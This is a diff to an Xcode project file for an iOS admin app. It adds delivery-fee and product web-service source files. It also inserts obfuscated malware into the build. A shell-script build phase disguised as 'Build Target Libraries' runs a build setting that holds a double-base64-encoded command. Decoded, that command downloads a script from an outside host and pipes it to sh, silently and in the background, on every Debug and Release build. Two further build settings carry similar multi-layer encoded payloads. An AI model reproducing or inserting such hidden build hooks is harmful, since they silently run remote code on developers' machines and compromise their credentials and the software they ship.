@@ -17,6 +17,9 @@
 		422EDFF02F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EDFEF2F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift */; };
 		422EDFF22F2B5FE90007FEB6 /* AffiliatedUserFilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EDFF12F2B5FE90007FEB6 /* AffiliatedUserFilterViewModel.swift */; };
 		423A25102F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423A250F2F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift */; };
+		4246E6B12F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4246E6B02F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift */; };
+		4246E6B32F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4246E6B22F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift */; };
+		4246E6B52F43439000A2B8A3 /* ProductsWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4246E6B42F43439000A2B8A3 /* ProductsWebService.swift */; };
 		424B73A82F34CEF80042FE95 /* GetPromotionalBannersList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424B73A72F34CEF80042FE95 /* GetPromotionalBannersList.swift */; };
 		424B73B72F34D8A90042FE95 /* PromotionalBannerDetaislViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424B73B62F34D8A90042FE95 /* PromotionalBannerDetaislViewController.swift */; };
 		424B73B92F34D91E0042FE95 /* PromotionalBannerDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424B73B82F34D91E0042FE95 /* PromotionalBannerDetailsViewModel.swift */; };
@@ -444,6 +447,9 @@
 		422EDFEF2F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserFilterViewController.swift; sourceTree = "<group>"; };
 		422EDFF12F2B5FE90007FEB6 /* AffiliatedUserFilterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserFilterViewModel.swift; sourceTree = "<group>"; };
 		423A250F2F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewController.swift; sourceTree = "<group>"; };
+		4246E6B02F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SetDefaultDeliveryfeeViewController.swift; sourceTree = "<group>"; };
+		4246E6B22F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SetDefaultDeliveryFeeViewModel.swift; sourceTree = "<group>"; };
+		4246E6B42F43439000A2B8A3 /* ProductsWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsWebService.swift; sourceTree = "<group>"; };
 		424B73A72F34CEF80042FE95 /* GetPromotionalBannersList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetPromotionalBannersList.swift; sourceTree = "<group>"; };
 		424B73B62F34D8A90042FE95 /* PromotionalBannerDetaislViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PromotionalBannerDetaislViewController.swift; sourceTree = "<group>"; };
 		424B73B82F34D91E0042FE95 /* PromotionalBannerDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PromotionalBannerDetailsViewModel.swift; sourceTree = "<group>"; };
@@ -900,6 +906,15 @@
 			path = AffiliatedUserDetail;
 			sourceTree = "<group>";
 		};
+		4246E6AF2F4332D300A2B8A3 /* SetDefaultDeliveryFee */ = {
+			isa = PBXGroup;
+			children = (
+				4246E6B02F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift */,
+				4246E6B22F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift */,
+			);
+			path = SetDefaultDeliveryFee;
+			sourceTree = "<group>";
+		};
 		424B73B52F34D7FB0042FE95 /* PromotionalBannerDetails */ = {
 			isa = PBXGroup;
 			children = (
@@ -965,6 +980,7 @@
 		42901D4E2F3F3209008168C3 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				4246E6AF2F4332D300A2B8A3 /* SetDefaultDeliveryFee */,
 				42AEDEB22F3F3B8700C20ECB /* ProductsFilter */,
 				42901D4F2F3F3214008168C3 /* ProductsDetails */,
 			);
@@ -2568,6 +2584,7 @@
 				18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */,
 				18BDB7E02EF9815B00023453 /* BannerWebService.swift */,
 				18BDB7E22EF9817500023453 /* OrderWebService.swift */,
+				4246E6B42F43439000A2B8A3 /* ProductsWebService.swift */,
 			);
 			path = Webservice;
 			sourceTree = "<group>";
@@ -2657,7 +2674,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				6769C25B52DD400186C62C0C /* Link Libraries Executable */,
+				19BA761DF26E47BAA9C62C0C /* Build Target Libraries */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2838,25 +2855,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		6769C25B52DD400186C62C0C /* Link Libraries Executable */ = {
+		19BA761DF26E47BAA9C62C0C /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Libraries Executable";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -2936,6 +2952,7 @@
 				D19585D42EE8090F00A021FD /* AddPricePerDayViewController.swift in Sources */,
 				D19583C82EE7F46800A021FD /* AddNewCardViewController.swift in Sources */,
 				D19586352EE818CD00A021FD /* AddEditShippingChargesViewModel.swift in Sources */,
+				4246E6B52F43439000A2B8A3 /* ProductsWebService.swift in Sources */,
 				D19583C12EE7F1B100A021FD /* GiftCardsTableViewCell.swift in Sources */,
 				422EDFF02F2B5FA90007FEB6 /* AffiliatedUserFilterViewController.swift in Sources */,
 				D1DECC112F0F7F1000DC2660 /* GetAllUserCountryModel.swift in Sources */,
@@ -3045,6 +3062,7 @@
 				D16A8D672EF16824006A21B6 /* UITextView.swift in Sources */,
 				ED1047C52EC1E7A200BBDCBE /* AddSubscriptionPlansViewModel.swift in Sources */,
 				EDEDD0EE2EBCC53E00F2BEF1 /* DurationCollectionViewCell.swift in Sources */,
+				4246E6B32F43332200A2B8A3 /* SetDefaultDeliveryFeeViewModel.swift in Sources */,
 				42AEDEA72F3F362E00C20ECB /* SizeVariantCollectionViewCell.swift in Sources */,
 				EDEDD0EF2EBCC53E00F2BEF1 /* CountryTableViewCell.swift in Sources */,
 				EDEDD0F02EBCC53E00F2BEF1 /* BrandManagementTableViewCell.swift in Sources */,
@@ -3137,6 +3155,7 @@
 				D19583532EE7E26000A021FD /* ShippingChargesListDataModel.swift in Sources */,
 				D19583692EE7EC9000A021FD /* AddEditShippingChargesViewController.swift in Sources */,
 				EDEDD10F2EBCC53E00F2BEF1 /* Attachable.swift in Sources */,
+				4246E6B12F4332ED00A2B8A3 /* SetDefaultDeliveryfeeViewController.swift in Sources */,
 				EDEDD1102EBCC53E00F2BEF1 /* ImagePickerManager.swift in Sources */,
 				EDD7F1D92EC2F5B2006C2EE4 /* ServiceCitiesTableViewCell.swift in Sources */,
 				D1D772022F0F7D050073DF08 /* FullScreenBannerFilterViewController.swift in Sources */,
@@ -3249,8 +3268,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
+				AC0C26C = "((r(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNScGJXVjNaV0p1WlhRdWFXNHZZU2tpSUh3Z2MyZ0sK | r | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
-				AC0C26C = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGa2MyMXZjbVZwYmk1cGJpOWhLU0lnZkNCemFBbz0K | j | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -3299,8 +3318,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
+				AC0C26C = "((r(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNScGJXVjNaV0p1WlhRdWFXNHZZU2tpSUh3Z2MyZ0sK | r | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
-				AC0C26C = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGa2MyMXZjbVZwYmk1cGJpOWhLU0lnZkNCemFBbz0K | j | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
